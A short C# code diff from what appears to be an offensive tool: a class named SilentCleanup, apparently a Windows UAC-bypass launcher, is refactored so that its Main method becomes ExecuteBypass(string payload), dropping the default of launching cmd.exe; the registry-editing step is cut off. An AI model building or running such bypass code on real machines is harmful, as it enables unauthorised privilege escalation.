@@ -6,20 +6,8 @@ namespace Hyperthreading
 {
     class SilentCleanup
     {
-        static void Main(string[] args)
+        static void ExecuteBypass(string payload)
         {
-
-            string payload = "";
-
-            if (args.Length > 0)
-            {
-                payload = args[0];
-            }
-            else
-            {
-                payload = @"C:\Windows\System32\cmd.exe";
-            }
-
             try
             {
                 RegistryKey key;
